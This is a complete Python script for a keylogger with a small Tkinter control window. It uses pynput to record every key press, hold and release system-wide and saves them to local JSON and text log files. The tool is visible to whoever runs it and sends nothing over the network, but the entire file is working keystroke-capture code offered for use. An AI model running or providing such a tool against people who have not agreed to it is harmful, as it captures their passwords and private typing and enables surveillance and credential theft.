import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import json

keys_used = []
flag = False
keys = ""
listener = None

def generate_text_log(key):
    with open('key_log.txt', "w+") as keys:
        keys.write(key)

def generate_json_file(keys_used):
    with open('key_log.json', '+wb') as key_log:
        key_list_bytes = json.dumps(keys_used).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global flag, keys_used, keys
    if not flag:
        keys_used.append({'Pressed': f'{key}'})
        flag = True
    else:
        keys_used.append({'Held': f'{key}'})
    generate_json_file(keys_used)

def on_release(key):
    global flag, keys_used, keys
    keys_used.append({'Released': f'{key}'})
    flag = False
    generate_json_file(keys_used)
    keys += str(key)
    generate_text_log(str(keys))

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    status_label.config(text="[+] Keylogger is running!", fg="green")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    if listener:
        listener.stop()
        status_label.config(text="Keylogger stopped.", fg="red")
        start_button.config(state='normal')
        stop_button.config(state='disabled')

def exit_app():
    stop_keylogger()
    root.quit()

root = tk.Tk()
root.title("Keylogger")
root.geometry("300x200")
root.resizable(False, False)
root.configure(bg="#f4f4f4")

frame = tk.Frame(root, bg="#ffffff", padx=10, pady=10)
frame.pack(pady=20, fill="both", expand=True)

status_label = tk.Label(frame, text='Click "Start" to begin keylogging.', font=("Arial", 10), bg="#ffffff")
status_label.pack(pady=10)

button_frame = tk.Frame(frame, bg="#ffffff")
button_frame.pack(pady=10)

start_button = tk.Button(button_frame, text="Start", command=start_keylogger, width=10, bg="#4CAF50", fg="white")
start_button.grid(row=0, column=0, padx=5)

stop_button = tk.Button(button_frame, text="Stop", command=stop_keylogger, width=10, bg="#f44336", fg="white", state='disabled')
stop_button.grid(row=0, column=1, padx=5)

exit_button = tk.Button(frame, text="Exit", command=exit_app, width=10, bg="#555555", fg="white")
exit_button.pack(pady=10)

root.mainloop()
